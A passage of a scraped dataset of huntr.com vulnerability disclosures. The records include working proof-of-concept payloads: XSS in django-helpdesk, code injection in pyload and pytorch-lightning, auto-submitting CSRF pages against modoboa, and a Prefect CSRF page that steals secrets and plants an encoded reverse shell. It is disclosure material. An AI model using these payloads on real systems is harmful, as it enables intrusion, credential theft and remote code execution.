CAgICAgICBmb250LWZhbWlseTogLWFwcGxlLXN5c3RlbSwgc3lzdGVtLXVpLCBCbGlua01hY1N5c3RlbUZvbnQsICJTZWdvZSBVSSIsICJPcGVuIFNhbnMiLCAiSGVsdmV0aWNhIE5ldWUiLCBIZWx2ZXRpY2EsIEFyaWFsLCBzYW5zLXNlcmlmOwogICAgICAgIAogICAgfQogICAgZGl2IHsKICAgICAgICB3aWR0aDogNjAwcHg7CiAgICAgICAgbWFyZ2luOiA1ZW0gYXV0bzsKICAgICAgICBwYWRkaW5nOiAyZW07CiAgICAgICAgYmFja2dyb3VuZC1jb2xvcjogI2ZkZmRmZjsKICAgICAgICBib3JkZXItcmFkaXVzOiAwLjVlbTsKICAgICAgICBib3gtc2hhZG93OiAycHggM3B4IDdweCAycHggcmdiYSgwLDAsMCwwLjAyKTsKICAgIH0KICAgIGE6bGluaywgYTp2aXNpdGVkIHsKICAgICAgICBjb2xvcjogIzM4NDg4ZjsKICAgICAgICB0ZXh0LWRlY29yYXRpb246IG5vbmU7CiAgICB9CiAgICBAbWVkaWEgKG1heC13aWR0aDogNzAwcHgpIHsKICAgICAgICBkaXYgewogICAgICAgICAgICBtYXJnaW46IDAgYXV0bzsKICAgICAgICAgICAgd2lkdGg6IGF1dG87CiAgICAgICAgfQogICAgfQogICAgPC9zdHlsZT4gICAgCjwvaGVhZD4KCjxib2R5Pgo8ZGl2PgogICAgPGgxPkV4YW1wbGUgRG9tYWluPC9oMT4KICAgIDxwPlRoaXMgZG9tYWluIGlzIGZvciB1c2UgaW4gaWxsdXN0cmF0aXZlIGV4YW1wbGVzIGluIGRvY3VtZW50cy4gWW91IG1heSB1c2UgdGhpcwogICAgZG9tYWluIGluIGxpdGVyYXR1cmUgd2l0aG91dCBwcmlvciBjb29yZGluYXRpb24gb3IgYXNraW5nIGZvciBwZXJtaXNzaW9uLjwvcD4KICAgIDxwPjxhIGhyZWY9Imh0dHBzOi8vd3d3LmlhbmEub3JnL2RvbWFpbnMvZXhhbXBsZSI+TW9yZSBpbmZvcm1hdGlvbi4uLjwvYT48L3A+CjwvZGl2Pgo8L2JvZHk+CjwvaHRtbD4K]]></response>\n      <responseRedirected>false</responseRedirected>\n    </requestresponse>\n  </issue>\n</issues>\n\n------WebKitFormBoundaryRfZMUQMkH0VF1JMi--\nImpact\nAn attacker is able to execute JavaScript in the browser of the user consulting affected vulnerability."}, "https://huntr.com/bounties/be7f211d-4bfd-44fd-91e8-682329906fbd/": {"cve": "CVE-2021-3994", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2021-3994", "cwe": "CWE-79: Cross-site Scripting (XSS) - Stored", "cwe_link": "https://cwe.mitre.org/data/definitions/79.html", "severity_score": "High (8.8)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nRequired\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nHigh\nOpen in visual CVSS calculator", "repo_link": "https://github.com/django-helpdesk/django-helpdesk", "fix_commit": "https://www.github.com/django-helpdesk/django-helpdesk/commit/a22eb0673fe0b7784f99c6b5fd343b64a6700f06", "description": "Description\nStored XSS via Markdown at Description or Comment of Ticket\nDetail\nWhen rendering to Markdown, the application does not filter and check the properties are valid, so when the user enters [XSS](javascript:alert(`document.domain`)) it will render as <a href=\"javascript:alert(document.domain)\">XSS</a> .\nProof of Concept\n// PoC.req\nPOST /tickets/submit/ HTTP/1.1\nHost: 127.0.0.1:8080\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:95.0) Gecko/20100101 Firefox/95.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: http://127.0.0.1:8080/tickets/submit/\nContent-Type: multipart/form-data; boundary=---------------------------69350364819088505273728279714\nContent-Length: 1161\nOrigin: http://127.0.0.1:8080\nDNT: 1\nConnection: close\nCookie: csrftoken=UQd46tUHKV3P08qcvIBTOBWDzS9nDZT8TDeCT6W8ThDUPLdWgKmlxwF3bBEGThC0\nUpgrade-Insecure-Requests: 1\nSec-Fetch-Dest: document\nSec-Fetch-Mode: navigate\nSec-Fetch-Site: same-origin\nSec-Fetch-User: ?1\n\n-----------------------------69350364819088505273728279714\nContent-Disposition: form-data; name=\"csrfmiddlewaretoken\"\n\no6SgjwQ9VozjIi2mYHAi5ImkD7UbKviMnTTO69SA4K9oxVP6JJlKOD5KfQpu0N1E\n-----------------------------69350364819088505273728279714\nContent-Disposition: form-data; name=\"queue\"\n\n1\n-----------------------------69350364819088505273728279714\nContent-Disposition: form-data; name=\"title\"\n\nXSS Markdown\n-----------------------------69350364819088505273728279714\nContent-Disposition: form-data; name=\"body\"\n\n[XSS](javascript:alert(`document.domain`))\n-----------------------------69350364819088505273728279714\nContent-Disposition: form-data; name=\"priority\"\n\n3\n-----------------------------69350364819088505273728279714\nContent-Disposition: form-data; name=\"due_date\"\n\n\n-----------------------------69350364819088505273728279714\nContent-Disposition: form-data; name=\"attachment\"; filename=\"\"\nContent-Type: application/octet-stream\n\n\n-----------------------------69350364819088505273728279714\nContent-Disposition: form-data; name=\"submitter_email\"\n\nxss@test.com\n-----------------------------69350364819088505273728279714--\nStep to Reproduce\nTicket\nGoto URL without login to create a new ticket: https://[DOMAIN]/tickets/submit/\nAt field [Description of your issue input with payload: [XSS](javascript:alert(`document.domain`))\nComment Ticket\nAt field [Comment / Resolution] input with payload: [XSS](javascript:alert(`document.domain`))\nThe XSS will trigger when the admin click on the content of the description or the comment\nImpact\nThis vulnerability has the potential to steal a user's cookie and gain unauthorized access to that user's account through the stolen cookie."}, "https://huntr.com/bounties/4d7a5fdd-b2de-467a-ade0-3f2fb386638e/": {"cve": "CVE-2021-3950", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2021-3950", "cwe": "CWE-79: Cross-site Scripting (XSS) - Stored", "cwe_link": "https://cwe.mitre.org/data/definitions/79.html", "severity_score": "High (8.8)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nRequired\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nHigh\nOpen in visual CVSS calculator", "repo_link": "https://github.com/django-helpdesk/django-helpdesk", "fix_commit": "https://www.github.com/django-helpdesk/django-helpdesk/commit/04483bdac3b5196737516398b5ce0383875a5c60", "description": "Description\nStored XSS via upload 'Attachments' with format .svg or .html\nDetail\nWhen opening the attachment, some format files will be rendered and loaded on the browser. So it allows executing arbitrary javascript code that was injected into attachment before.\nProof of Concept\n// PoC.svg\n<?xml version=\"1.0\" standalone=\"no\"?>\n<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\" \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\">\n\n<svg version=\"1.1\" baseProfile=\"full\" xmlns=\"http://www.w3.org/2000/svg\">\n   <rect width=\"300\" height=\"100\" style=\"fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)\" />\n   <script type=\"text/javascript\">\n      alert(\"XSS\");\n   </script>\n</svg>\nStep top Reproduct\nCreate a ticket with an unauthenticated user\nUpload .svg or .html into attachments\nThe XSS will trigger when the admin open the attachment\nImpact\nThis vulnerability has the potential to steal a user's cookie and gain unauthorized access to that user's account through the stolen cookie."}, "https://huntr.com/bounties/745f483c-70ed-441f-ab2e-7ac1305439a4/": {"cve": "CVE-2021-3945", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2021-3945", "cwe": "CWE-79: Cross-site Scripting (XSS) - Stored", "cwe_link": "https://cwe.mitre.org/data/definitions/79.html", "severity_score": "High (8.8)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nRequired\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nHigh\nOpen in visual CVSS calculator", "repo_link": "https://github.com/django-helpdesk/django-helpdesk", "fix_commit": "https://www.github.com/django-helpdesk/django-helpdesk/commit/2c7065e0c4296e0c692fb4a7ee19c7357583af30", "description": "Description\nStored XSS via parameter [title] when create new ticket\nDetails\nAt the table tickets in admin, when rendering data for column [Ticket] it allows for arbitrary execution of JavaScript\nVulnerability code\n{\n                        data: \"ticket\",\n                        render: function (data, type, row, meta) {\n                            if (type === 'display') {\n                                data = '<div class=\"tickettitle\"><a href=\"' + get_url(row) + '\" >' +\n                                    row.id + '. ' +\n                                    row.title + '</a></div>';\n                            }\n                            return data\n                        }\n                    },\nRender with [title] contain payload\n<td><div class=\"tickettitle\"><a href=\"/tickets/57832/\">57832. \"&gt;<img src=\"x\" onerror=\"alert(1);\"></a></div></td>\nProof of Concept\n// PoC.req\nPOST /tickets/submit/ HTTP/1.1\nHost: django-helpdesk-demo.herokuapp.com\nCookie: csrftoken=5xfltA7UxP3sMJG5OHKCAlHRzR9mrrUbXWfwOrJJl6JhC3OszzsZBcFMEmbCsIeh\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:95.0) Gecko/20100101 Firefox/95.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: https://django-helpdesk-demo.herokuapp.com/tickets/submit/\nContent-Type: multipart/form-data; boundary=---------------------------35329910622610784793670383726\nContent-Length: 1150\nOrigin: https://django-helpdesk-demo.herokuapp.com\nDnt: 1\nUpgrade-Insecure-Requests: 1\nSec-Fetch-Dest: document\nSec-Fetch-Mode: navigate\nSec-Fetch-Site: same-origin\nSec-Fetch-User: ?1\nTe: trailers\nConnection: close\n\n-----------------------------35329910622610784793670383726\nContent-Disposition: form-data; name=\"csrfmiddlewaretoken\"\n\nSn6i713aQfmhgW3ET6Q39tRXE3yt0kePKM6tsSFZEw266gb1EYyqakPSJyAJ1ByV\n-----------------------------35329910622610784793670383726\nContent-Disposition: form-data; name=\"queue\"\n\n1\n-----------------------------35329910622610784793670383726\nContent-Disposition: form-data; name=\"title\"\n\n\"><iMg SrC=\"x\" oNeRRor=\"alert(1);\">\n-----------------------------35329910622610784793670383726\nContent-Disposition: form-data; name=\"body\"\n\ntest\n-----------------------------35329910622610784793670383726\nContent-Disposition: form-data; name=\"priority\"\n\n3\n-----------------------------35329910622610784793670383726\nContent-Disposition: form-data; name=\"due_date\"\n\n\n-----------------------------35329910622610784793670383726\nContent-Disposition: form-data; name=\"attachment\"; filename=\"\"\nContent-Type: application/octet-stream\n\n\n-----------------------------35329910622610784793670383726\nContent-Disposition: form-data; name=\"submitter_email\"\n\ntest@example.com\n-----------------------------35329910622610784793670383726--\nStep to Reproduct\nGoto URL without login to create a new ticket: https://django-helpdesk-demo.herokuapp.com/tickets/submit/\nAt field [Summary of the problem] input with payload: \"><iMg SrC=\"x\" oNeRRor=\"alert(1);\">\nThe XSS will trigger when the admin load all tickets\nImpact\nThis vulnerability has the potential to steal a user's cookie and gain unauthorized access to that user's account through the stolen cookie."}, "https://huntr.com/bounties/3fd606f7-83e1-4265-b083-2e1889a05e65/": {"cve": "CVE-2023-0297", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2023-0297", "cwe": "CWE-94: Code Injection", "cwe_link": "https://cwe.mitre.org/data/definitions/94.html", "severity_score": "Critical (9.8)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nHigh\nOpen in visual CVSS calculator", "repo_link": "https://github.com/pyload/pyload", "fix_commit": "https://www.github.com/pyload/pyload/commit/7d73ba7919e594d783b3411d7ddb87885aea782d", "description": "Description\nAn unauthenticated attacker can execute arbitrary python code by abusing js2py functionality.\nAlso, due to the lack of CSRF protection, a victim can be tricked to execute arbitrary python code.\nProof of Concept\nRun the command below and touch /tmp/pwnd gets executed.\ncurl -i -s -k -X $'POST' \\\n    -H $'Host: 127.0.0.1:8000' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 184' \\\n    --data-binary $'package=xxx&crypted=AAAA&jk=%70%79%69%6d%70%6f%72%74%20%6f%73%3b%6f%73%2e%73%79%73%74%65%6d%28%22%74%6f%75%63%68%20%2f%74%6d%70%2f%70%77%6e%64%22%29;f=function%20f2(){};&passwords=aaaa' \\\n    $'http://127.0.0.1:8000/flash/addcrypted2'\nDecoded jk parameter: pyimport os;os.system(\"touch /tmp/pwnd\");f=function f2(){};\nYou can also send the url of a website that hosts the HTML file below to a victim.\n<html>\n  <!-- CSRF PoC - generated by Burp Suite Professional -->\n  <body>\n  <script>history.pushState('', '', '/')</script>\n    <form action=\"http://127.0.0.1:9666/flash/addcrypted2\" method=\"POST\">\n      <input type=\"hidden\" name=\"package\" value=\"xxx\" />\n      <input type=\"hidden\" name=\"crypted\" value=\"AAAA\" />\n      <input type=\"hidden\" name=\"jk\" value=\"pyimport&#32;os&#59;os&#46;system&#40;&quot;touch&#32;&#47;tmp&#47;pwnd&quot;&#41;&#59;f&#61;function&#32;f2&#40;&#41;&#123;&#125;&#59;\" />\n      <input type=\"hidden\" name=\"passwords\" value=\"aaaa\" />\n      <input type=\"submit\" value=\"Submit request\" />\n    </form>\n  </body>\n</html>\nImpact\nThis vulnerability is capable of executing arbitrary python code."}, "https://huntr.com/bounties/a795bf93-c91e-4c79-aae8-f7d8bda92e2a/": {"cve": "CVE-2022-0845", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2022-0845", "cwe": "CWE-94: Code Injection", "cwe_link": "https://cwe.mitre.org/data/definitions/94.html", "severity_score": "High (7.3)\nAttack vector\nLocal\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nRequired\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nLow\nOpen in visual CVSS calculator", "repo_link": "https://github.com/pytorchlightning/pytorch-lightning", "fix_commit": "https://www.github.com/pytorchlightning/pytorch-lightning/commit/8b7a12c52e52a06408e9231647839ddb4665e8ae", "description": "Description\nThe attacker can execute commands on the target OS running the operating system by setting the PL_TRAINER_GPUS when using the Trainer module.\nProof of Concept\n$ pip3 install pytorch-lightning\nimport os\nfrom pytorch_lightning import Trainer\nfrom pytorch_lightning.utilities.argparse import *\n\n\nparse_env_variables(Trainer)\n$ ls\nos.environ[\"PL_TRAINER_GPUS\"] = 'os.system(\"touch rickroll\")'\n\nparse_env_variables(Trainer)\n$ ls\nrickroll\nCollab Notebook: https://colab.research.google.com/drive/1lMPSsKN7cNWcHkh7ZBvsNkCZRcoTPJq8?usp=sharing\nImpact\nThis vulnerability is capable of executing remote code on the target system in the context of the user running the program."}, "https://huntr.com/bounties/dab47d99-551c-4355-9ab1-c99cb90235af/": {"cve": "CVE-2023-6022", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2023-6022", "cwe": "CWE-352: Cross-Site Request Forgery (CSRF)", "cwe_link": "https://cwe.mitre.org/data/definitions/352.html", "severity_score": "High (8.8)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nRequired\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nHigh\nOpen in visual CVSS calculator", "repo_link": "https://github.com/prefecthq/prefect", "fix_commit": "https://www.github.com/prefecthq/prefect/commit/227dfcc7e3374c212a4bcd68b14e090b1c02d9d3", "description": "Description\nIf you are running the dashboard locally there is no csrf/cors/no auth and therefore you are vulnerable to cross site request forgeries. Worse yet, the service is almost certainly at 127.0.0.1:4200, reducing any need for recon or brute force. CSRF/cors/lack of auth is also likely to be a issue on self hosted instances based on the lack of documentation about how to configure auth to function similar to the cloud version.\nProof of Concept\n<!doctype html>\n\n<html lang=\"en\">\n\n<head>\n    <meta charset=\"utf-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n    <title>Prefect cross site request POC</title>\n    <meta name=\"author\" content=\"Joshua Bonnett\">\n    <meta property=\"og:title\" content=\"Prefect cross site request POC\">\n    <meta property=\"og:description\" content=\"A simple poc for prefect block data extraction \">\n    <script src=\"https://ajax.googleapis.com/ajax/libs/jquery/3.7.0/jquery.min.js\"></script>\n</head>\n\n<body>\n    <hr />\n    <h1> Stolen Block content:</h1>\n    <div class=\"block_content\"> </div>\n    <h1> Stolen Artifact content:</h1>\n    <hr />\n    <div class=\"artifacts\"> </div>\n    <hr />\n    <h1> Stolen variable content:</h1>\n    <hr />\n    <div class=\"vars\"> </div>\n    <hr />\n    <h1> Notes:</h1>\n    Note that this wasn't sent anywhere, but it easily could have been sent with a second post to a server of my\n    choosing, and it need not be on its own page, it could be in a ad, 10 iframes deep on a common watering hole site.\n\n    Recommendation: actually enforce csrf header requirements, get rid of the \"include_secrets\" api flag.\n    <script>\n\n        fetch(\"http://127.0.0.1:4200/api/block_documents/filter\", {\n            \"headers\": {\n                \"accept\": \"application/json, text/plain, */*\",\n                \"content-type\": \"application/json\",\n            },\n            \"body\": \"{\\\"include_secrets\\\":true}\",\n            \"method\": \"POST\",\n            \"mode\": \"cors\",\n        }).then(x => x.text()).then(y => $('div.block_content').html(y));\n\n        fetch(\"http://127.0.0.1:4200/api/artifacts/latest/filter\", {\n            \"headers\": {\n                \"accept\": \"application/json, text/plain, */*\",\n                \"content-type\": \"application/json\",\n            },\n            \"body\": \"\",\n            \"method\": \"POST\",\n            \"mode\": \"cors\",\n        }).then(x => x.text()).then(y => $('div.artifacts').html(y));\n        fetch(\"  http://127.0.0.1:4200/api/variables/filter\", {\n            \"headers\": {\n                \"accept\": \"application/json, text/plain, */*\",\n                \"content-type\": \"application/json\",\n            },\n            \"body\": \"\",\n            \"method\": \"POST\",\n            \"mode\": \"cors\",\n        }).then(x => x.text()).then(y => $('div.vars').html(y));\n\n        //***** Find process blocks and change them****//\n        fetch(\"http://127.0.0.1:4200/api/block_documents/filter\", {\n            \"headers\": {\n                \"accept\": \"application/json, text/plain, */*\",\n                \"content-type\": \"application/json\",\n            },\n            \"body\": \"{\\\"include_secrets\\\":true}\",\n            \"method\": \"POST\",\n            \"mode\": \"cors\",\n        }).then(x => x.json()).then(function (data) {\n            data.forEach(element => {\n                if (element.block_type.name == \"Process\") {\n                    fetch(\"http://127.0.0.1:4200/api/block_documents/\" + element.id, {\n                        \"headers\": {\n                            \"accept\": \"application/json, text/plain, */*\",\n                            \"accept-language\": \"en-US,en;q=0.9\",\n                            \"cache-control\": \"no-cache\",\n                            \"content-type\": \"application/json\",\n                            \"pragma\": \"no-cache\",\n                            \"sec-ch-ua-mobile\": \"?0\",\n                            \"sec-ch-ua-platform\": \"\\\"Linux\\\"\",\n                            \"sec-fetch-dest\": \"empty\",\n                            \"sec-fetch-mode\": \"cors\",\n                            \"sec-fetch-site\": \"same-origin\",\n                            \"sec-gpc\": \"1\",\n                            \"x-prefect-ui\": \"true\"\n                        },\n                        \"referrer\": \"http://127.0.0.1:4200/blocks/block/e3129574-2094-4411-a685-5c327a0201df/edit\",\n                        \"body\": \"{\\\"data\\\":{\\\"command\\\":[\\\"python\\\", \\\"-c\\\", \\\"import base64,sys;exec(base64.b64decode(sys.argv[1]))\\\", \\\"aW1wb3J0IG9zLHB0eSxzb2NrZXQ7cz1zb2NrZXQuc29ja2V0KCk7cy5jb25uZWN0KCgiMTI3LjAuMC4xIiw5MDAxKSk7W29zLmR1cDIocy5maWxlbm8oKSxmKWZvciBmIGluKDAsMSwyKV07cHR5LnNwYXduKCJzaCIp\\\"], \\\"stream_output\\\":true}, \\\"merge_existing_data\\\":false}\",\n                        \"method\": \"PATCH\"\n                    });\n                }\n            });\n        });\n    </script>\n</body>\n\n</html>\nImpact\nStealing or changing secrets from blocks(example: aws creds, azur cred blocks) Stealing or changing variables inputs from blocks/variables(example: remote file block,) Stealing any output data from artifacts(Example: output from ml runs)\nReverse shell is possible by changing any existing Process blocks to a reverse shell (set to localhost port 9001 in the Poc, but I could have it connect back over the internet), triggers when a flow that uses that block runs. I could add code to trigger a quick run on all flows to ensure connect back shell happens immediately but I leave that to the reader.\nA very similar effect could happen within the docker container, Azure Container Instance Job, ECS Task, GCP Cloud Run Job and Kubernetes Job blocks if they are configured. I didn't include them in the poc because of the complexity of setting them up in my dev env, but adapting the poc to each of these block types would be very simple.\nI would recommend moving the configuration of those block types into flow code where it isnt updateable from the web, and it can be managed like code."}, "https://huntr.com/bounties/980c75a5-d978-4b0e-9bcc-2b2682c97e01/": {"cve": "CVE-2023-5690", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2023-5690", "cwe": "CWE-352: Cross-Site Request Forgery (CSRF)", "cwe_link": "https://cwe.mitre.org/data/definitions/352.html", "severity_score": "Medium (5.3)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nLow\nIntegrity\nNone\nAvailability\nNone\nOpen in visual CVSS calculator", "repo_link": "https://github.com/modoboa/modoboa", "fix_commit": "https://www.github.com/modoboa/modoboa/commit/23e4c25511c66c0548da001236f47e19e3f9e4d9", "description": "Description\nLogout CSRF is a security vulnerability where an attacker forces a user to unknowingly log out of their session by tricking them into triggering a logout request through a malicious website or link.\nThe csrftoken for the logout interface is invalid, it is recommended to change it to http post type to send the request\nGET /accounts/logout/\nProof of Concept\n<html>\n  <!-- CSRF PoC - generated by Burp Suite Professional -->\n  <body>\n  <script>history.pushState('', '', '/')</script>\n    <form action=\"https://demo.modoboa.org/accounts/logout/\">\n      <input type=\"submit\" value=\"Submit request\" />\n    </form>\n    <script>\n      document.forms[0].submit();\n    </script>\n  </body>\n</html>\nThe fix can be found in\nhttps://github.com/WeblateOrg/weblate/commit/bfa82b569114608d3fc16d2f957ee2ab696cd581\nImpact\nThis vulnerability is capable of causing a user to inadvertently log out.\nFor example src=\"<your logout link>\"\nOne way GET could be abused here is if a person (maybe a competitor :)) places an image tag anywhere on the internet, and if a user of your site stumbles upon that page, he will be unknowingly logged out.\nAlthough this won't harm the user's account, it can be a big annoyance and is valid for CSRF."}, "https://huntr.com/bounties/ec367b1d-5ec4-4ab2-881a-caf82e4877d9/": {"cve": "CVE-2023-5498", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2023-5498", "cwe": "CWE-352: Cross-Site Request Forgery (CSRF)", "cwe_link": "https://cwe.mitre.org/data/definitions/352.html", "severity_score": "Medium (4.3)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nRequired\nScope\nUnchanged\nConfidentiality\nNone\nIntegrity\nLow\nAvailability\nNone\nOpen in visual CVSS calculator", "repo_link": "https://github.com/chiefonboarding/chiefonboarding", "fix_commit": "https://www.github.com/chiefonboarding/chiefonboarding/commit/7de93f5fcc21e8f16fa0a64d38461c1b48ff3ee7", "description": "Description\nA data altering method is done through a get request in AdminTaskToggleDoneView, making it vulnerable to csrf attack. In django, get request is considered as a safe method and is not protected against csrf.\nProof of Concept\nclass AdminTaskToggleDoneView(LoginRequiredMixin, ManagerPermMixin, RedirectView):\n    permanent = False\n    pattern_name = \"admin_tasks:detail\"\n\n    def get(self, request, *args, **kwargs):\n        task_id = self.kwargs.get(\"pk\", -1)\n        admin_task = get_object_or_404(AdminTask, id=task_id)\n        admin_task.completed = not admin_task.completed\n        admin_task.save() # <- Marked as completed\n        return super().get(request, *args, **kwargs)\nImpact\nAn attacker can make an admin mark a task as completed on his behalf without him knowing"}, "https://huntr.com/bounties/619fb490-69ad-4a2a-b686-4c42a62404a9/": {"cve": "CVE-2023-2228", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2023-2228", "cwe": "CWE-352: Cross-Site Request Forgery (CSRF)", "cwe_link": "https://cwe.mitre.org/data/definitions/352.html", "severity_score": "Medium (6.8)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nHigh\nUser interaction\nRequired\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nHigh\nOpen in visual CVSS calculator", "repo_link": "https://github.com/modoboa/modoboa", "fix_commit": "https://www.github.com/modoboa/modoboa/commit/5d886f3d06373d2c3292911bac0772bcd5102343", "description": "Description\nGET /admin/accounts/{id}/edit/?active_tab=default page is vulnerable to a CSRF attack.\nProof of Concept\nLogin as admin. try to edit admin accounts (example id=4) Open the following file in the browser.\n<!DOCTYPE html> <html> <!-- CSRF PoC - generated by Burp Suite Professional --> <body> <form action=\"https://demo.modoboa.org/admin/accounts/4/edit/\"> <input type=\"hidden\" name=\"active_tab\" value=\"default\" /> <input type=\"submit\" value=\"Submit request\" /> </form> <script> history.pushState('', '', '/'); document.forms[0].submit(); </script> </body> </html>\nImpact\nAttacker would be forced to edit& update admin accounts"}, "https://huntr.com/bounties/41d2e921-08ec-4361-9df4-59fa45f70c83/": {"cve": "", "cve_link": "", "cwe": "CWE-352: Cross-Site Request Forgery (CSRF)", "cwe_link": "https://cwe.mitre.org/data/definitions/352.html", "severity_score": "Medium (6.5)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nRequired\nScope\nUnchanged\nConfidentiality\nNone\nIntegrity\nHigh\nAvailability\nNone\nOpen in visual CVSS calculator", "repo_link": "https://github.com/demindiro/agreper", "fix_commit": "https://www.github.com/demindiro/agreper/commit/09f56bd1fe8ca0af015ce10d8b41a3d65c454b59", "description": "Description\nThe application is vulnerable to a CSRF attack.\nProof of Concept\nLogin as admin.\nOpen the following HTML file in the browser. This action is equivalent to clicking a link sent by an attacker.\ntrap.html\n<html>\n  <!-- CSRF PoC - generated by Burp Suite Professional -->\n  <body>\n  <script>history.pushState('', '', '/')</script>\n    <form action=\"http://localhost:8000/admin/user/new/\" method=\"POST\">\n      <input type=\"hidden\" name=\"name\" value=\"csrf\" />\n      <input type=\"hidden\" name=\"password\" value=\"password\" />\n      <input type=\"submit\" value=\"Submit request\" />\n    </form>\n  </body>\n</html>\nClick the button.\nA new user is created.\nImpact\nThis vulnerability is capable of allowing an attacker to force a victim to perform admin actions such as:\nCreating a new user\nChanging user's role"}, "https://huntr.com/bounties/07a5b61b-306d-47c4-8ff0-06c540c7dfb3/": {"cve": "CVE-2023-0438", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2023-0438", "cwe": "CWE-352: Cross-Site Request Forgery (CSRF)", "cwe_link": "https://cwe.mitre.org/data/definitions/352.html", "severity_score": "Medium (5.4)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nRequired\nScope\nUnchanged\nConfidentiality\nNone\nIntegrity\nLow\nAvailability\nLow\nOpen in visual CVSS calculator", "repo_link": "https://github.com/modoboa/modoboa", "fix_commit": "https://www.github.com/modoboa/modoboa/commit/38d778cc71e370216e067d054ce0169ad83078c8", "description": "Description\nremove function is vulnerable to CSRF lead to remove any Administrators users GET /admin/permissions/remove/?domid=2&daid=15\nProof of Concept\n1/ visit /admin/domains/1/\n2/ delete button to remove permission is vulnerable to CSRF\nhttps://drive.google.com/file/d/1fs_2MID6uT_f7rvjJQYK_m-e6q39PMez/view?usp=sharing\n3 visit POC by changing value will remove administrator username\n<html>\n  <!-- CSRF PoC - generated by Burp Suite Professional -->\n  <body>\n  <script>history.pushState('', '', '/')</script>\n    <form action=\"https//l27.0.0.1/admin/permissions/remove/\">\n      <input type=\"hidden\" name=\"domid\" value=\"2\" />\n      <input type=\"hidden\" name=\"daid\" value=\"15\" />\n      <input type=\"submit\" value=\"Submit request\" />\n    </form>\n  </body>\n</html>\nReferance\ncause the same by deleting the administrative username in\nhttps://huntr.dev/bounties/0a852351-00ed-44d2-a650-9055b7beed58/\nhttps://huntr.dev/bounties/d7007f76-3dbc-48a7-a2fb-377040fe100c/\nImpact\nAllows an attacker to induce users to perform actions that they do not intend to perform"}, "https://huntr.com/bounties/d7007f76-3dbc-48a7-a2fb-377040fe100c/": {"cve": "CVE-2023-0406", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2023-0406", "cwe": "CWE-352: Cross-Site Request Forgery (CSRF)", "cwe_link": "https://cwe.mitre.org/data/definitions/352.html", "severity_score": "Medium (5.4)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nRequired\nScope\nUnchanged\nConfidentiality\nNone\nIntegrity\nLow\nAvailability\nLow\nOpen in visual CVSS calculator", "repo_link": "https://github.com/modoboa/modoboa", "fix_commit": "https://www.github.com/modoboa/modoboa/commit/7f0573e917227686d2cc127be1364e2908740807", "description": "Description\nThe deleting a user functionality is vulnerable to a CSRF attack.\nThe cause is same with the deleting a domain functionality.\nProof of Concept\nLogin as admin.\nCreate a user to be deleted. E.g. the user ID is 2.\nOpen the following file in the browser.\n<html>\n  <!-- CSRF PoC - generated by Burp Suite Professional -->\n  <body>\n  <script>history.pushState('', '', '/')</script>\n    <form action=\"http://localhost:8000/admin/accounts/2/delete/\">\n      <input type=\"submit\" value=\"Submit request\" />\n    </form>\n    <script>\n      document.forms[0].submit();\n    </script>\n  </body>\n</html>\nImpact\nAn attacker can force a victim to delete users."}, "https://huntr.com/bounties/0a852351-00ed-44d2-a650-9055b7beed58/": {"cve": "CVE-2023-0398", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2023-0398", "cwe": "CWE-352: Cross-Site Request Forgery (CSRF)", "cwe_link": "https://cwe.mitre.org/data/definitions/352.html", "severity_score": "Medium (5.4)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nRequired\nScope\nUnchanged\nConfidentiality\nNone\nIntegrity\nLow\nAvailability\nLow\nOpen in visual CVSS calculator", "repo_link": 